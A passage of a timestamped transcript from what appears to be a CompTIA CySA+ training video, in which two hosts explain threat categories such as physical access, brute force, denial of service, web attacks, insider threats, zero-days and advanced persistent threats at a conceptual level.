fun to play with.\n\n158\n00:07:35.283 --> 00:07:38.545\nAnd if I have physical\naccess to an environment.\n\n159\n00:07:38.545 --> 00:07:42.978\nI can drop one of these LAN Turtles\nthat basically just plugs in line to\n\n160\n00:07:42.978 --> 00:07:45.662\nthe system, and now I have shell access.\n\n161\n00:07:45.662 --> 00:07:46.428\n&gt;&gt; Wow.\n\n162\n00:07:46.428 --> 00:07:47.821\n&gt;&gt; Into their network, right?\n\n163\n00:07:47.821 --> 00:07:50.574\nSo, physical access into things,\nvery, very dangerous.\n\n164\n00:07:50.574 --> 00:07:53.070\nAlso think about the idea\nof exfiltrating data.\n\n165\n00:07:53.070 --> 00:07:55.314\n&gt;&gt; Mm-hm.\n&gt;&gt; All right, maybe I'm plugging USB in,\n\n166\n00:07:55.314 --> 00:07:56.966\nbut maybe I'm not dropping malware.\n\n167\n00:07:56.966 --> 00:07:58.602\nMaybe I'm grabbing data.\n\n168\n00:07:58.602 --> 00:08:02.296\nSaving it to the drive and\nthen leaving with that drive.\n\n169\n00:08:02.296 --> 00:08:05.561\n&gt;&gt; You can fit a lot of data on\na really small device nowadays.\n\n170\n00:08:05.561 --> 00:08:10.096\n&gt;&gt; So I have a thumb drive sized SSD.\n\n171\n00:08:10.096 --> 00:08:10.823\n&gt;&gt; Mm-hm.\n\n172\n00:08:10.823 --> 00:08:12.750\n&gt;&gt; And it holds 256 gigs.\n\n173\n00:08:12.750 --> 00:08:13.630\n&gt;&gt; Wow.\n&gt;&gt; Right,\n\n174\n00:08:13.630 --> 00:08:17.360\nso I can get a lot of data on that and\nit's super fast.\n\n175\n00:08:17.360 --> 00:08:21.290\nIt'll plug into any standard USB port,\nnot USB-C.\n\n176\n00:08:21.290 --> 00:08:24.490\nI'd have to have an adapter for\nthat because that's relatively new.\n\n177\n00:08:24.490 --> 00:08:28.520\nBut most computers have\na standard USB port.\n\n178\n00:08:28.520 --> 00:08:29.800\nPlug that sucker in there.\n\n179\n00:08:29.800 --> 00:08:31.180\nLook for the data I want.\n\n180\n00:08:31.180 --> 00:08:32.540\nExfiltrate it and leave.\n\n181\n00:08:32.540 --> 00:08:33.651\n&gt;&gt; Easy to put it in your pocket.\n\n182\n00:08:33.651 --> 00:08:35.250\nNobody's any the wiser, and you're gone.\n\n183\n00:08:35.250 --> 00:08:37.578\n&gt;&gt; That's right, and\nhave you seen some of these USB drives?\n\n184\n00:08:37.578 --> 00:08:39.675\nTiny itty-bitty things.\n\n185\n00:08:39.675 --> 00:08:42.688\nYou can still get some pretty good\nsized ones even if they're small.\n\n186\n00:08:42.688 --> 00:08:43.311\n&gt;&gt; Absolutely.\n\n187\n00:08:43.311 --> 00:08:45.012\n&gt;&gt; So very sneaky stuff.\n\n188\n00:08:45.012 --> 00:08:48.560\nAll right, so there's your idea of\nphysical access at least a good\n\n189\n00:08:48.560 --> 00:08:49.450\ngeneralization.\n\n190\n00:08:49.450 --> 00:08:51.191\nAnd with some specifics there.\n\n191\n00:08:51.191 --> 00:08:55.177\nLet's move on to what some people\ncall them attrition attacks.\n\n192\n00:08:55.177 --> 00:08:58.248\nOr just,\ni like to go with that cuz basically\n\n193\n00:08:58.248 --> 00:09:02.819\nyou're hammering away at something\nuntil it gives up the ghost.\n\n194\n00:09:02.819 --> 00:09:05.172\nThat's the technical definition, right?\n\n195\n00:09:05.172 --> 00:09:07.043\nNow [LAUGH]\n&gt;&gt; Yeah [LAUGH]\n\n196\n00:09:07.043 --> 00:09:08.918\n&gt;&gt; But let me give you a more close\n\n197\n00:09:08.918 --> 00:09:13.700\nexample, and that may further\nilluminate what the definition is.\n\n198\n00:09:13.700 --> 00:09:16.390\nBrute force attacks, right,\nI did say that, brute force.\n\n199\n00:09:16.390 --> 00:09:20.261\nI'm brute forcing passwords,\nI'm brute forcing web keys,\n\n200\n00:09:20.261 --> 00:09:22.205\nI'm brute forcing anything.\n\n201\n00:09:22.205 --> 00:09:27.289\nAnything that will allow me to hammer\nat it with data until I am able to\n\n202\n00:09:27.289 --> 00:09:32.840\nfind some condition that equals true and\nallows me access into the thing.\n\n203\n00:09:32.840 --> 00:09:35.290\nSo I'm working through\nthe idea of attrition,\n\n204\n00:09:35.290 --> 00:09:38.440\nI am, I know what now is not good.\n\n205\n00:09:38.440 --> 00:09:42.610\nTrying to find something that might be\ngood to allow me access into the machine.\n\n206\n00:09:42.610 --> 00:09:44.230\nSo that's attrition.\n\n207\n00:09:44.230 --> 00:09:48.940\nWell, also the idea of the denial of\nservice and distributed denial of service.\n\n208\n00:09:48.940 --> 00:09:56.310\nWhere I am trying to knock off systems or\nservices through hammering.\n\n209\n00:09:56.310 --> 00:09:57.180\n&gt;&gt; Yeah.\n\n210\n00:09:57.180 --> 00:10:00.060\n&gt;&gt; Sending them so much information or\nrequest or whatever,\n\n211\n00:10:00.060 --> 00:10:05.170\nthat they can no longer handle\nthem in a timely manner or at all.\n\n212\n00:10:05.170 --> 00:10:10.140\nAnd the service crashes or just unable\nto respond because it's processing so\n\n213\n00:10:10.140 --> 00:10:15.070\nmany requests that I'm giving it or\ndata that I've sent it so that it just has\n\n214\n00:10:15.070 --> 00:10:20.310\nno ability to give you standard service,\nand your user gets a bad experience.\n\n215\n00:10:20.310 --> 00:10:21.960\nThat's the denial of service idea.\n\n216\n00:10:21.960 --> 00:10:24.715\nThose are types of attrition attacks,\nokay?\n\n217\n00:10:24.715 --> 00:10:27.770\nWeb-based attacks are very\ncommon nowadays as well.\n\n218\n00:10:27.770 --> 00:10:29.080\nThat's why we have.\n\n219\n00:10:29.080 --> 00:10:32.750\nIn a web application\npenetration testing because,\n\n220\n00:10:32.750 --> 00:10:37.650\nalthough most people run their business\nthey have some sort of web presence.\n\n221\n00:10:37.650 --> 00:10:42.650\nAnd that makes so much harder because\nit is meant to be publicly accessible.\n\n222\n00:10:42.650 --> 00:10:44.960\nTherefore, people in\nthe public that aren't so\n\n223\n00:10:44.960 --> 00:10:49.150\nnice have the ability to start trying\nto hammer away at these things.\n\n224\n00:10:49.150 --> 00:10:54.369\nReally quickly, cross-site scripting\nis very popular, also cross-site\n\n225\n00:10:54.369 --> 00:10:59.360\nrequest forgery attacks, also very\npopular, being able to basically.\n\n226\n00:11:00.750 --> 00:11:04.450\nUse scripts and\nhave it be interpreted by the browser or\n\n227\n00:11:04.450 --> 00:11:07.530\nthe machines that are visiting that.\n\n228\n00:11:07.530 --> 00:11:13.220\nWeb service will actually render\nthat code instead of seeing it as\n\n229\n00:11:13.220 --> 00:11:18.330\noutside code that's unrelated to\nthe website that you're actually visiting.\n\n230\n00:11:18.330 --> 00:11:21.720\nSo this able to use script tags and\nthings of that nature.\n\n231\n00:11:21.720 --> 00:11:25.610\nYou can do Java scripting,\nyou can issue MEL scripting.\n\n232\n00:11:25.610 --> 00:11:29.956\nAll sorts of bad things can occur\nwhen cross-site scripting and\n\n233\n00:11:29.956 --> 00:11:32.330\ncross-site request forgery is enabled.\n\n234\n00:11:32.330 --> 00:11:34.615\nAnother one would be SQL injection.\n\n235\n00:11:34.615 --> 00:11:35.900\n&gt;&gt; Mm-hm.\n\n236\n00:11:35.900 --> 00:11:38.230\n&gt;&gt; A common web vulnerability.\n\n237\n00:11:39.850 --> 00:11:43.690\nThen there's browser vulnerabilities\nthat have inherent issues\n\n238\n00:11:43.690 --> 00:11:45.350\nwhere you're going to a website.\n\n239\n00:11:45.350 --> 00:11:48.940\nMaybe I have a spooked site up,\nI can set up\n\n240\n00:11:48.940 --> 00:11:53.170\ndifferent browser attacks where JavaScript\nwhere, hey, run this JavaScript.\n\n241\n00:11:53.170 --> 00:11:54.600\nYou get the little security prompt.\n\n242\n00:11:54.600 --> 00:11:57.640\nThank goodness that Java understands\nthese things happens and\n\n243\n00:11:57.640 --> 00:12:00.950\nthey have really done a lot to try to\nbolster their security measures up.\n\n244\n00:12:00.950 --> 00:12:05.390\nSo if you get that warning that, hey,\nthis site's trying to run JavaScript.\n\n245\n00:12:05.390 --> 00:12:09.640\nAre you sure you wanna do,\nthen you gonna add exceptional kind thing?\n\n246\n00:12:09.640 --> 00:12:15.270\nBut if you're crafty enough to get people\nto believe the line you're feeding them,\n\n247\n00:12:15.270 --> 00:12:18.630\nmaybe they'll click that, yeah,\nhad that exception and run that and\n\n248\n00:12:18.630 --> 00:12:20.160\nI can get access to the system.\n\n249\n00:12:20.160 --> 00:12:25.590\nSo these are just different types of\nweb attacks that will be [INAUDIBLE].\n\n250\n00:12:25.590 --> 00:12:28.650\nMoving on.\nEmail, we all know these man.\n\n251\n00:12:28.650 --> 00:12:35.140\nHopefully, I assume that at this level,\nwe should all know what web attacks are.\n\n252\n00:12:35.140 --> 00:12:40.826\nPhishing emails and scams of that nature,\nmalware that comes along through a link or\n\n253\n00:12:40.826 --> 00:12:44.070\nattachments In the email.\n\n254\n00:12:44.070 --> 00:12:47.190\nVery, very common,\nbeen around for quite some time.\n\n255\n00:12:47.190 --> 00:12:50.796\nEven your slowest-level user,\nif they don't know about this,\n\n256\n00:12:50.796 --> 00:12:55.188\nthey need to know about this, you need to\nbe able to categorize these attacks and\n\n257\n00:12:55.188 --> 00:12:57.110\nset them in their proper station.\n\n258\n00:12:58.230 --> 00:13:01.260\nLet's see here, other attacks,\nthese are the kind of things that.\n\n259\n00:13:02.440 --> 00:13:06.390\nI can say you got really a home for\nthem per se.\n\n260\n00:13:06.390 --> 00:13:08.980\nSo we're just gonna\nclassify them as other.\n\n261\n00:13:08.980 --> 00:13:12.010\nThey could be buffer overflows, what else?\n\n262\n00:13:12.010 --> 00:13:13.200\nSecurity misconfiguration.\n\n263\n00:13:13.200 --> 00:13:14.290\nThat's always a fun one.\n\n264\n00:13:14.290 --> 00:13:15.750\n&gt;&gt;

It's easy, right?\n\n272\n00:13:35.020 --> 00:13:35.795\n&gt;&gt; Yeah, it's super easy.\n\n273\n00:13:35.795 --> 00:13:36.507\n&gt;&gt; Administratively.\n&gt;&gt; Man.\n\n274\n00:13:36.507 --> 00:13:38.839\n&gt;&gt; I'm not to worry about if my\nusers calling up and saying hey,\n\n275\n00:13:38.839 --> 00:13:40.060\nI can't access anything.\n\n276\n00:13:40.060 --> 00:13:42.510\n&gt;&gt; Yeah, yeah, cuz you will get that.\n\n277\n00:13:42.510 --> 00:13:47.809\nHey, I'm trying to access, well, we only\nallow access from x, y, and z areas.\n\n278\n00:13:47.809 --> 00:13:50.382\nWish don't just turn it on,\nbecause that's not a really good way,\n\n279\n00:13:50.382 --> 00:13:51.520\nthat's not a best practice.\n\n280\n00:13:51.520 --> 00:13:55.360\nSo misconfigurations,\nalso things like permissions.\n\n281\n00:13:55.360 --> 00:13:59.540\nPermissions could be, and\nactually a super common way that,\n\n282\n00:13:59.540 --> 00:14:03.480\nyou remember,\npermissions are a security measure.\n\n283\n00:14:03.480 --> 00:14:08.670\nI set permissions so that Mike has\naccess and Ronnie doesn't, all right.\n\n284\n00:14:08.670 --> 00:14:09.760\n&gt;&gt; It's just layers of defense.\n\n285\n00:14:09.760 --> 00:14:11.740\n&gt;&gt; Exactly, these layers of defense.\n\n286\n00:14:11.740 --> 00:14:15.630\nIf I configure it to where Mike and\n\n287\n00:14:15.630 --> 00:14:18.820\nRonnie have access through\nan accidental configuration maybe I\n\n288\n00:14:18.820 --> 00:14:21.880\ndidn't realized that Mike and\nRonnie are both in the same group.\n\n289\n00:14:21.880 --> 00:14:25.270\nAnd I'm setting group permissions,\nand I add the group that I will.\n\n290\n00:14:25.270 --> 00:14:27.150\nI know Mike's in this group, and\nI know Mike's in that group, and\n\n291\n00:14:27.150 --> 00:14:28.290\nI know Mike's in this group.\n\n292\n00:14:28.290 --> 00:14:32.680\nSo I add those groups because you're\ntypically adding group permissions and\n\n293\n00:14:32.680 --> 00:14:37.320\nnot individual permissions cuz\nthat's best practices in most cases.\n\n294\n00:14:37.320 --> 00:14:39.780\nBut I don't realize that\nRonnie's in one of those groups.\n\n295\n00:14:39.780 --> 00:14:43.400\nI have now inadvertently\ngiving Ronnie permissions to\n\n296\n00:14:43.400 --> 00:14:45.620\nsomething that he\nshouldn't have access to.\n\n297\n00:14:45.620 --> 00:14:48.230\nSo this is a security misconfiguration,\nright?\n\n298\n00:14:48.230 --> 00:14:50.130\nThese are the things that\nwe have to look out for.\n\n299\n00:14:50.130 --> 00:14:52.190\nAnd these are threats that\nwe need to be classified.\n\n300\n00:14:52.190 --> 00:14:56.070\nSo make sure you understand\nthat when you do a scan and\n\n301\n00:14:56.070 --> 00:15:00.540\nit says something like security\nmisconfiguration or under another tag.\n\n302\n00:15:00.540 --> 00:15:05.350\nAnd shows user's permissions by\nthese groups are here, and you've\n\n303\n00:15:05.350 --> 00:15:09.290\nmaybe defined that they shouldn't be there\nand it realizes that throughout your scan.\n\n304\n00:15:09.290 --> 00:15:09.880\nWell, there you go.\n\n305\n00:15:09.880 --> 00:15:11.770\nNow, you've gotta mitigate that problem.\n\n306\n00:15:11.770 --> 00:15:13.550\nSo just be aware of that.\n\n307\n00:15:13.550 --> 00:15:15.180\nInsider threats.\n\n308\n00:15:15.180 --> 00:15:15.995\nThose are fun.\n\n309\n00:15:15.995 --> 00:15:16.520\n&gt;&gt; Mm-hm.\n\n310\n00:15:16.520 --> 00:15:18.475\n&gt;&gt; And yet unfortunately common.\n\n311\n00:15:18.475 --> 00:15:20.190\n&gt;&gt; Yeah.\n\n312\n00:15:20.190 --> 00:15:23.810\n&gt;&gt; Some people just don't like their job\nor they're angry at their company or\n\n313\n00:15:23.810 --> 00:15:28.340\nthe prospect of making\nsome ill-gotten gain,\n\n314\n00:15:28.340 --> 00:15:31.570\ncould be just a little too tempting for\nthem to resist.\n\n315\n00:15:31.570 --> 00:15:34.757\nAnd therefore you've got\na man on the inside or\n\n316\n00:15:34.757 --> 00:15:37.325\na woman on the inside as it may be and.\n\n317\n00:15:37.325 --> 00:15:42.270\nThey are already behind many\nof your defense layers.\n\n318\n00:15:42.270 --> 00:15:45.760\nThey have authorized access to the system.\n\n319\n00:15:45.760 --> 00:15:47.920\nNow, what could they do?\n\n320\n00:15:47.920 --> 00:15:50.401\nWell, maybe they have\naccess to that server, and\n\n321\n00:15:50.401 --> 00:15:52.538\nthey can perform these physical attacks.\n\n322\n00:15:52.538 --> 00:15:57.310\nMaybe they know a little bit about\nthe code behind your web front ads.\n\n323\n00:15:57.310 --> 00:15:59.225\nAnd they have access to that.\n\n324\n00:15:59.225 --> 00:16:01.363\nAnd/or maybe there's\na security misconfiguration.\n\n325\n00:16:01.363 --> 00:16:05.762\nAnd they've realized that,\nI can see HR or I can see this.\n\n326\n00:16:05.762 --> 00:16:09.386\nI can get some financial information,\nex-filtrate that data and\n\n327\n00:16:09.386 --> 00:16:13.860\nsend it to a competitor, and they're going\nto pay me a handsome sum to do that act.\n\n328\n00:16:13.860 --> 00:16:18.100\nSo insider threats are very,\nvery unfortunate and common.\n\n329\n00:16:18.100 --> 00:16:23.300\nSometimes, they'll do things like setup\na wireless, like a rogue wireless AP.\n\n330\n00:16:23.300 --> 00:16:26.980\nSo now, an outsider can be\nsitting in the parking lot,\n\n331\n00:16:26.980 --> 00:16:30.500\ngain access to the rogue AP and\nnow they have access.\n\n332\n00:16:30.500 --> 00:16:34.604\nSo maybe if the insiders themselves\naren't technically savvy, per se,\n\n333\n00:16:34.604 --> 00:16:37.000\nthey give access to someone who is, okay.\n\n334\n00:16:37.000 --> 00:16:40.845\nSo they're piggy backing off of them.\n\n335\n00:16:40.845 --> 00:16:48.450\nWhat else, yeah, they could be\nsetting up FTP servers wherewithal.\n\n336\n00:16:48.450 --> 00:16:50.880\n&gt;&gt; They might be intentionally\nopening holes in your defenses, or\n\n337\n00:16:50.880 --> 00:16:52.410\nunintentionally like you were saying.\n\n338\n00:16:52.410 --> 00:16:57.066\nI just want wireless access at my desk, so\nthey put a little wireless access point\n\n339\n00:16:57.066 --> 00:17:01.856\nthere not realizing that it's covering\nthe parking lot, that it's not secured,\n\n340\n00:17:01.856 --> 00:17:02.960\nthings like that.\n\n341\n00:17:02.960 --> 00:17:06.586\nAnd insiders are a huge threat and\nextremely dangerous cuz if you think\n\n342\n00:17:06.586 --> 00:17:09.857\nabout, we always talk about\nthose layers of defense, right?\n\n343\n00:17:09.857 --> 00:17:13.640\nThey already passed the majority\nof your layers of defense, right?\n\n344\n00:17:13.640 --> 00:17:16.630\nYour firewalls, your DMZs, all that.\n\n345\n00:17:16.630 --> 00:17:20.055\nThey're already inside,\nso it's a huge risk.\n\n346\n00:17:20.055 --> 00:17:21.517\n&gt;&gt; And like Mike said,\n\n347\n00:17:21.517 --> 00:17:26.863\nyou can classify them into malicious\nversus inadvertent, kinda thing.\n\n348\n00:17:26.863 --> 00:17:28.630\nAnd just remember that these\nare all general ideas.\n\n349\n00:17:28.630 --> 00:17:31.446\nThey are not set in stone\nthat you have to [SOUND].\n\n350\n00:17:31.446 --> 00:17:35.857\nYou might wanna be familiar with\nthe terminology that Comptia uses for\n\n351\n00:17:35.857 --> 00:17:40.713\nthe CYSA Plus, is what we're going over,\nbut in real life, you can classify\n\n352\n00:17:40.713 --> 00:17:45.900\nthem any way and you'll see them\ngenerally used in these definitions.\n\n353\n00:17:45.900 --> 00:17:49.258\nAll right, and then of course, improper or\nillegal use of any company resource,\n\n354\n00:17:49.258 --> 00:17:50.730\nwould be an insider threat as well.\n\n355\n00:17:50.730 --> 00:17:55.455\nYou don't, hey, I can, I know a little\nbit about these computer things,\n\n356\n00:17:55.455 --> 00:17:59.130\nI'll set up my own web server and\nuse our public access, so\n\n357\n00:17:59.130 --> 00:18:04.610\nthat I don't have to pay for registration,\nand getting an internet fees and all that.\n\n358\n00:18:04.610 --> 00:18:09.456\nSo that would be an illegal\nuse of company resources.\n\n359\n00:18:09.456 --> 00:18:12.628\nAll right,\nlet's move into now Mike's favorite topic,\n\n360\n00:18:12.628 --> 00:18:14.320\nthe unknown threats, right?\n\n361\n00:18:14.320 --> 00:18:16.360\nHow do we classify an unknown threat?\n\n362\n00:18:16.360 --> 00:18:20.764\nWell, for the exam there are typically\njust two, I think two, yeah,\n\n363\n00:18:20.764 --> 00:18:25.318\nbasically two that we need to know about,\nwhich are Zero-Day attacks,\n\n364\n00:18:25.318 --> 00:18:30.115\nand Advanced Persistent Threats or\nAPT as they are commonly referred to as.\n\n365\n00:18:30.115 --> 00:18:33.270\nSo let's talk about Zero-Day attacks.\n\n366\n00:18:33.270 --> 00:18:37.240\nI have brought up FireEye as\nwebsite on my computer here.\n\n367\n00:18:37.240 --> 00:18:38.523\nSo we could take a look,\n\n368\n00:18:38.523 --> 00:18:42.270\nthey have done a great job of\ndefining what a Zero-Day attack is.\n\n369\n00:18:42.270 --> 00:18:47.099\nThey basically say Zero-Day\nattacks are cyber attacks against\n\n370\n00:18:47.099 --> 00:18:52.026\nsoftware flaws that are unknown and\nhave no patcher fix, right?\n\n371\n00:18:52.026 --> 00:18:56.552\nSo it's extremely difficult and\non they go with their definition of it but\n\n372\n00:18:56.552 --> 00:19:00.932\nbasically what they are saying is,\nis that only say an unknown threat,\n\n373\n00:19:00.932 --> 00:19:04.290\nthe threat is there, but\nno one has discovered it yet,\n\n374\n00:19:04.290 --> 00:19:09.700\nat least as far as the organization,\nthat would be able to fix it is concern.\n\n375\n00:19:09.700 --> 00:19:12.737\nThey are very well,\nmaybe a very gifted hackers out there, and\n\n376\n00:19:12.737 --> 00:19:16.293\nthreat hackers that have discovered\nthat there's a vulnerability, but\n\n377\n00:19:16.293 --> 00:19:17.690\nthey haven't reported it.\n\n378\n00:19:17.690 --> 00:19:23.230\nThere's just using it to their own game,\nthey exploiting something that nobody\n\n379\n00:19:23.230 --> 00:19:29.048\nknows but them, and this is really the,\nwhat would someone say, the secret sauce.\n\n380\n00:19:29.048 --> 00:19:31.688\n&gt;&gt; [LAUGH]\n&gt;&gt; That a lot of these high level threat\n\n381\n00:19:31.688 --> 00:19:37.580\nactors have in their toolbag, they're very\ngifted at coding and reverse engineering.\n\n382\n00:19:37.580 --> 00:19:42.223\nAnd they find these flaws, and they keep\nit to themselves so that when companies,\n\n383\n00:19:42.223 --> 00:19:43.502\nor organizations, or\n\n384\n00:19:43.502 --> 00:19:47.230\nNation-states hire them to do\nthe work that they need them to do.\n\n385\n00:19:47.230 --> 00:19:50.992\nThey have, they're like, well,\nyou can hire me, and I can ask for\n\n386\n00:19:50.992 --> 00:19:55.250\na lot of money because I can get into\nsystems everybody else can't, right?\n\n387\n00:19:55.250 --> 00:19:59.090\nSo they have this specialized capabilities\nusing these Zero-Day exploits.\n\n388\n00:19:59.090 --> 00:20:03.690\nIt is very,\nvery dangerous because, anybody?\n\n389\n00:20:03.690 --> 00:20:07.479\n&gt;&gt; We don't know, I mean, most of\nour defences rely on definition and\n\n390\n00:20:07.479 --> 00:20:08.550\nthings like that.\n\n391\n00:20:08.550 --> 00:20:10.980\nAnd so if it is unknown,\nthere's no definitions,\n\n392\n00:20:10.980 --> 00:20:13.060\nour systems won't detect it at all.\n\n393\n00:20:13.060 --> 00:20:15.327\nWe really have to be\nlooking at other means,\n\n394\n00:20:15.327 --> 00:20:17.670\nlike behavioral analysis things like that.\n\n395\n00:20:17.670 --> 00:20:19.520\n&gt;&gt; That's exactly right.\n\n396\n00:20:19.520 --> 00:20:22.530\nWe're doing our best effort to\ntry to mitigate against them.\n\n397\n00:20:22.530 --> 00:20:25.160\nBut, since we don't know what they are,\n\n398\n00:20:25.160 --> 00:20:29.180\na lot of times Zero-Day\nexploits are very devastating.\n\n399\n00:20:29.180 --> 00:20:33.305\nSo that would be one of\nthe classifications of an unknown threat,\n\n400\n00:20:33.305 --> 00:20:34.730\nwould be a Zero-Day.\n\n401\n00:20:34.730 --> 00:20:39.240\nNow, let's move into, actually, I think\nthey actually have a couple of Zero-Day\n\n402\n00:20:39.240 --> 00:20:41.477\nexploits, just to give you an idea here.\n\n403\n00:20:41.477 --> 00:20:45.589\n2017 Zero-Day Exploits, here's a,\n\n404\n00:20:45.589 --> 00:20:49.699\nlet's see here EPS restore use after free,\n\n405\n00:20:49.699 --> 00:20:54.620\ngives you the CVEs for\nall these different ones.\n\n406\n00:20:54.620 --> 00:20:58.800\nWin32KDestroyWindow, Use-After-Free,\ninteresting with the Use-After-Free.\n\n407\n00:20:58.800 --> 00:21:02.079\nType Confusing EPS, what else?\n\n408\n00:21:02.079 --> 00:21:04.000\nHere are some from 2016.\n\n409\n00:21:04.000 --> 00:21:06.088\nFlash Zero-Day Exploit in the wild,\n\n410\n00:21:06.088 --> 00:21:08.961\nMicrosoft Zero-Day local\nprivilege escalation,\n\n411\n00:21:08.961 --> 00:21:13.150\nthat would've been a fun one to know\nabout before Microsoft got a hold of it.\n\n412\n00:21:13.150 --> 00:21:16.848\nAnd then you remember, just because\nMicrosoft patches it and it ceases\n\n413\n00:21:16.848 --> 00:21:21.298\nto become a Zero-Day, doesn't mean that\neveryone has applied that patch, right?\n\n414\n00:21:21.298 --> 00:21:25.081\nSo you still have time, even though it\nwouldn't be classified as a Zero-Day.\n\n415\n00:21:25.081 --> 00:21:27.250\nWe now, I've gone into known threats,\nall right?\n\n416\n00:21:27.250 --> 00:21:28.510\nSo that would move out of that category.\n\n417\n00:21:28.510 --> 00:21:31.504\n&gt;&gt; And there was my next question for\nyou Daniel, a Zero-Day,\n\n418\n00:21:31.504 --> 00:21:34.086\nonce it is known, I mean,\nit's no longer unknown,\n\n419\n00:21:34.086 --> 00:21:35.210\nso does it move into-\n&gt;&gt; Right.\n\n420\n00:21:35.210 --> 00:21:36.750\n&gt;&gt; Known threats.\n\n421\n00:21:36.750 --> 00:21:39.028\n&gt;&gt; Once it becomes known and\nthe vendor releases a fix-\n\n422\n00:21:39.028 --> 00:21:40.732\n&gt;&gt; It's no longer a Zero-Day.\n\n423\n00:21:40.732 --> 00:21:44.440\n&gt;&gt; It's no longer a Zero-Day, so\njust keep that in mind, okay?\n\n424\n00:21:44.440 --> 00:21:48.978\nAnd then they had a couple from 2015,\neverybody uses the Hangul Word Processor,\n\n425\n00:21:48.978 --> 00:21:51.130\nso that was super massive devastating.\n\n426\n00:21:51.130 --> 00:21:53.096\nI don't even know what that is.\n\n427\n00:21:53.096 --> 00:21:56.163\n[LAUGH] If you were using it, it could\nhave been a real problem, so there you go.\n\n428\n00:21:56.163 --> 00:21:58.790\nThere's some, you can take a look at this.\n\n429\n00:21:58.790 --> 00:22:00.700\nThis website will be in\nthe show note links.\n\n430\n00:22:00.700 --> 00:22:02.890\nSo check that out, all right.\n\n431\n00:22:02.890 --> 00:22:05.174\nThe last thing I wanna talk about\nis Advanced Persistent Threats.\n\n432\n00:22:05.174 --> 00:22:06.928\nLet me get out of here.\n\n433\n00:22:06.928 --> 00:22:11.490\nAlso from FireEye did a great job\nto define this for you good folks.\n\n434\n00:22:11.490 --> 00:22:15.711\nAgain, what\nare Advanced Persistent Threats?\n\n435\n00:22:15.711 --> 00:22:22.920\nWell, basically a very advanced\nattackers that write their own malware.\n\n436\n00:22:22.920 --> 00:22:26.680\nThat's probably the most\ngeneralized idea of it.\n\n437\n00:22:26.680 --> 00:22:30.523\nMalware that sense there is no\nknown signature for it, anti-virus,\n\n438\n00:22:30.523 --> 00:22:34.810\nanti-malware systems,\nprotections they are unable to discover.\n\n439\n00:22:34.810 --> 00:22:40.114\nAnd they know the ways in which\nthese systems hirestically,\n\n440\n00:22:40.114 --> 00:22:43.760\nfind new malware and they can avoid them.\n\n441\n00:22:43.760 --> 00:22:48.150\nThey're very, very crafty people and\nvery, very skilled.\n\n442\n00:22:49.160 --> 00:22:53.040\nThey tend to go after specific targets,\nit's not just a shotgun approach looking\n\n443\n00:22:53.040 --> 00:22:57.145\nfor something that's out there in the wild\nand going, I know how to exploit that,\n\n444\n00:22:57.145 --> 00:22:58.800\nlet me gain access to that system.\n\n445\n00:22:58.800 --> 00:23:03.238\nThese are very targeted threat actors and\n\n446\n00:23:03.238 --> 00:23:06.960\nmalware that they point toward.\n\n447\n00:23:06.960 --> 00:23:10.450\nI am after XYZ company because\nI've been hired to do so.\n\n448\n00:23:10.450 --> 00:23:14.077\nI'm angry at them or whatever the case,\nwhatever the motivation is,\n\n449\n00:23:14.077 --> 00:23:16.360\nthey tend to specifically target systems.\n\n450\n00:23:17.450 --> 00:23:21.691\nThey are able to gain unauthorized access\nbecause they're very, very skilled and\n\n451\n00:23:21.691 --> 00:23:23.760\nthey're able to maintain that access.\n\n452\n00:23:23.760 --> 00:23:26.530\nThrough their malware\nthat is undetectable.\n\n453\n00:23:26.530 --> 00:23:29.724\nThis is why they're called\nAdvanced Persistent Threats.\n\n454\n00:23:29.724 --> 00:23:31.380\nHopefully, you're getting the idea here.\n\n455\n00:23:31.380 --> 00:23:34.020\nI love definitions that define themselves.\n\n456\n00:23:34.020 --> 00:23:35.050\n&gt;&gt; Makes it easy for us, right?\n\n457\n00:23:35.050 --> 00:23:37.600\n[LAUGH]\n&gt;&gt; Yes, it does, really, really does.\n\n458\n00:23:37.600 --> 00:23:40.393\n&gt;&gt; But these are scary, you see this\nwhen you're looking at the news or\n\n459\n00:23:40.393 --> 00:23:41.228\nwatching the news.\n\n460\n00:23:41.228 --> 00:23:45.142\nAnd you see these large companies\nthat have had these breaches and\n\n461\n00:23:45.142 --> 00:23:49.481\nas the data starts coming out,\nas they do the research into the attacks,\n\n462\n00:23:49.481 --> 00:23:52.343\nfigure out what was going on and\nhow they got in.\n\n463\n00:23:52.343 --> 00:23:56.529\nThey realizing that the bad guys\ndidn't break in last week and\n\n464\n00:23:56.529 --> 00:23:58.570\nsteal 2 million accounts.\n\n465\n00:23:58.570 --> 00:24:00.592\n&gt;&gt; Right.\n&gt;&gt; They've been in there for months,\n\n466\n00:24:00.592 --> 00:24:03.373\nfor extended period of time,\nwatching everything,\n\n467\n00:24:03.373 --> 00:24:06.550\nlearning the way things work and\ndoing this all undetected.\n\n468\n00:24:06.550 --> 00:24:09.384\nAnd that's where\nAdvanced Persistent Threat comes in there.\n\n469\n00:24:09.384 --> 00:24:12.860\nThey're in there for\na long time without being detected.\n\n470\n00:24:12.860 --> 00:24:14.452\n&gt;&gt; And you know what's scary,\n\n471\n00:24:14.452 --> 00:24:19.165\nis like typically they're utilizing\nZero-Day Exploits since they're unknown,\n\n472\n00:24:19.165 --> 00:24:22.830\nthey can use those to piggyback off of and\nget into these systems.\n\n473\n00:24:22.830 --> 00:24:28.535\nLike I said, these people, this is the top\n10% of the threat actors out there.\n\n474\n00:24:28.535 --> 00:24:30.493\nThey're very smart,\nvery crafty individuals.\n\n475\n00:24:30.493 --> 00:24:32.050\nAll right, so let's.\n\n476\n00:24:32.050 --> 00:24:34.264\nI want to show you a little\nlook at FireEye again.\n\n477\n00:24:34.264 --> 00:24:37.240\nIt was a really good resource.\n\n478\n00:24:37.240 --> 00:24:41.895\nSo shows you these\nare the Advanced Persistent Threat\n\n479\n00:24:41.895 --> 00:24:44.902\ngroups that you might encounter.\n\n480\n00:24:44.902 --> 00:24:49.574\nAPT37, they give them different\nAPT number classifications.\n\n481\n00:24:50.585 --> 00:24:53.212\n&gt;&gt; Their suspected attribution\nis in North Korea.\n\n482\n00:24:53.212 --> 00:24:56.460\nTheir target is primarily South Korea but\nalso Japan, Vietnam, and\n\n483\n00:24:56.460 --> 00:24:59.820\nthe Middle East and various industry\nverticals including chemicals,\n\n484\n00:24:59.820 --> 00:25:03.995\nelectronics, manufacturing, aerospace,\nautomotive, and healthcare.\n\n485\n00:25:03.995 --> 00:25:08.481\nRemember, when I said they tend to target\nspecific systems, well, here is FireEye\n\n486\n00:25:08.481 --> 00:25:12.220\nletting us know exactly what this\ngroup is doing at this point in time.\n\n487\n00:25:12.220 --> 00:25:16.665\nAPT37 seems like 